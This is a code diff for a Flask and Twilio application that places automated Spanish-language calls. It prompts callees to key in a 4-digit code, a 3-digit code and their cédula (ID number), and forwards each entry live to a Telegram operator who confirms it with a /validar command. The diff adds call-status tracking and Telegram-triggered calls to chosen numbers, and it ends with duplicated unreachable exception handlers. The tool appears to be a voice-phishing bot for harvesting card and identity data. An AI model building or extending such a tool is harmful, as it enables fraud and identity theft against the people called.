@@ -108,27 +108,112 @@ def make_call():
     # Iniciar polling de Telegram si no está activo
     start_telegram_polling()
     
-    # Construir la URL correctamente - FIX: Usamos directamente una URL completa
+    # Construir la URL correctamente
     base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
     url = f"{base_url}/step1"
+    status_callback_url = f"{base_url}/call-status-callback"
+    
     logger.info(f"📞 URL para la llamada: {url}")
+    logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
     
     try:
         call = client.calls.create(
             to=YOUR_PHONE_NUMBER,
             from_=TWILIO_PHONE_NUMBER,
-            url=url
+            url=url,
+            status_callback=status_callback_url,
+            status_callback_method='POST',
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
         )
         
         # Inicializar la sesión para el nuevo SID
-        global_user_sessions[call.sid] = {}
+        global_user_sessions[call.sid] = {
+            'call_status': 'initiated',
+            'to_number': YOUR_PHONE_NUMBER,
+            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
         save_session_to_file(global_user_sessions)
+        
+        # Notificar a Telegram
+        send_to_telegram(f"🚀 <b>Llamada iniciada</b>\nSID: {call.sid}\nNúmero: {YOUR_PHONE_NUMBER}\nEstado: Iniciando...")
         
         logger.info(f"📞 Nueva llamada iniciada: SID={call.sid}")
         return jsonify({"status": "Llamada iniciada", "sid": call.sid})
     except Exception as e:
         logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/call-status-callback', methods=['POST'])
+def call_status_callback():
+    """Endpoint para recibir actualizaciones de estado de llamada desde Twilio."""
+    call_sid = request.values.get('CallSid')
+    call_status = request.values.get('CallStatus')
+    call_duration = request.values.get('CallDuration', '0')
+    
+    logger.info(f"📞 ACTUALIZACIÓN DE ESTADO DE LLAMADA: SID={call_sid}, Estado={call_status}, Duración={call_duration}s")
+    
+    # Verificar si existe la sesión para este SID
+    if call_sid not in global_user_sessions:
+        logger.warning(f"⚠️ Recibida actualización para SID desconocido: {call_sid}")
+        global_user_sessions[call_sid] = {}
+    
+    # Guardar el estado y la hora de la actualización
+    global_user_sessions[call_sid]['call_status'] = call_status
+    global_user_sessions[call_sid]['last_update'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    global_user_sessions[call_sid]['call_duration'] = call_duration
+    
+    # Obtener el número de teléfono si existe
+    to_number = global_user_sessions[call_sid].get('to_number', 'desconocido')
+    
+    # Guardar los cambios
+    save_session_to_file(global_user_sessions)
+    
+    # Definir un icono según el estado
+    status_icon = "📞"
+    status_desc = "Estado actualizado"
+    
+    if call_status == "initiated":
+        status_icon = "🔄"
+        status_desc = "Llamada iniciada"
+    elif call_status == "ringing":
+        status_icon = "📳"
+        status_desc = "Teléfono sonando"
+    elif call_status == "in-progress":
+        status_icon = "✅"
+        status_desc = "Llamada contestada"
+    elif call_status == "completed":
+        status_icon = "🏁"
+        status_desc = "Llamada finalizada"
+    elif call_status == "busy":
+        status_icon = "🔴"
+        status_desc = "Número ocupado"
+    elif call_status == "no-answer":
+        status_icon = "❌"
+        status_desc = "Sin respuesta"
+    elif call_status == "failed":
+        status_icon = "⚠️"
+        status_desc = "Llamada fallida"
+    elif call_status == "canceled":
+        status_icon = "🚫"
+        status_desc = "Llamada cancelada"
+    
+    # Crear mensaje de notificación
+    message = f"{status_icon} <b>{status_desc}</b>\nSID: {call_sid}\nNúmero: {to_number}\nEstado: {call_status}"
+    
+    # Añadir duración si está disponible y no es cero
+    if call_status in ["completed", "in-progress"] and call_duration != '0':
+        message += f"\nDuración: {call_duration}s"
+    
+    # Enviar notificación a Telegram
+    send_to_telegram(message)
+    
+    # Si hay un chat_id específico guardado, enviar también la notificación allí
+    telegram_chat_id = global_user_sessions[call_sid].get('telegram_chat_id')
+    if telegram_chat_id:
+        send_telegram_response(telegram_chat_id, message)
+    
+    return jsonify({"status": "ok"})
+
 @app.route('/step1', methods=['POST', 'GET'])
 def step1():
     response = VoiceResponse()
@@ -275,7 +360,7 @@ def save_step3():
     # Verificar si estamos en un proceso de revalidación
     is_revalidation = 'validacion' in global_user_sessions[call_sid]
     
-    # Guardar el nuevo código
+    # Guardar el código (cédula)
     global_user_sessions[call_sid]['cedula'] = digits
     
     # Si había una validación previa, la eliminamos para forzar una nueva validación
@@ -296,14 +381,23 @@ def save_step3():
     response = VoiceResponse()
     response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
     
+    # Verificar la longitud de los dígitos ingresados
+    digit_length = len(digits)
+    logger.info(f"📏 Longitud de cédula ingresada: {digit_length} dígitos")
+    
+    # Agregar pausa de 3 segundos si son 7 dígitos
+    if digit_length == 7:
+        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
+        response.pause(length=3)
+    
     # Mensaje diferente dependiendo si es validación inicial o revalidación
     if is_revalidation:
-        msg = f"🔄 Cédula actualizada:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        msg = f"🔄 Cédula actualizada:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
         send_to_telegram(msg)
         
         response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
     else:
-        msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
+        msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
         send_to_telegram(msg)
         
         response.say("Gracias. Estamos validando su información. Por favor, espere unos momentos.", language='es-ES')
@@ -797,26 +891,52 @@ def process_call_command(chat_id, message_text):
         return False
     
     try:
-        # Construir la URL correctamente - FIX: Usamos directamente una URL completa
-        url = f"{os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')}/step1"
-        logger.info(f"📞 URL para la llamada: {url}")
+        # Construir las URLs correctamente
+        base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
+        url = f"{base_url}/step1"
+        status_callback_url = f"{base_url}/call-status-callback"
         
-        # Hacer la llamada usando la API de Twilio
+        logger.info(f"📞 URL para la llamada: {url}")
+        logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
+        
+        # Hacer la llamada usando la API de Twilio con el callback de estado
         call = client.calls.create(
             to=phone_number,
             from_=TWILIO_PHONE_NUMBER,
-            url=url
+            url=url,
+            status_callback=status_callback_url,
+            status_callback_method='POST',
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
         )
         
-        # Inicializar la sesión para el nuevo SID
-        global_user_sessions[call.sid] = {}
+        # Inicializar la sesión para el nuevo SID con estado inicial
+        global_user_sessions[call.sid] = {
+            'call_status': 'initiated',
+            'to_number': phone_number,
+            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'telegram_chat_id': chat_id  # Guardar el chat_id para notificaciones posteriores
+        }
         save_session_to_file(global_user_sessions)
         
         logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}, Número={phone_number}")
         
         # Confirmar al usuario de Telegram
-        send_telegram_response(chat_id, f"✅ <b>Llamada iniciada al número {phone_number}</b>\nSID: {call.sid}")
+        send_telegram_response(chat_id, f"✅ <b>Llamada iniciada al número {phone_number}</b>\nSID: {call.sid}\nEstado: Iniciando...")
+        
+        # Notificar inmediatamente sobre la llamada iniciada
+        send_to_telegram(f"🚀 <b>Llamada iniciada</b>\nSID: {call.sid}\nNúmero: {phone_number}\nEstado: Iniciando...")
+        
         return True
+        
+    except Exception as e:
+        logger.error(f"❌ ERROR AL INICIAR LLAMADA DESDE TELEGRAM: {e}")
+        send_telegram_response(chat_id, f"❌ <b>Error al iniciar llamada:</b> {str(e)}")
+        return False
+        
+    except Exception as e:
+        logger.error(f"❌ ERROR AL INICIAR LLAMADA DESDE TELEGRAM: {e}")
+        send_telegram_response(chat_id, f"❌ <b>Error al iniciar llamada:</b> {str(e)}")
+        return False
         
     except Exception as e:
         logger.error(f"❌ ERROR AL INICIAR LLAMADA DESDE TELEGRAM: {e}")
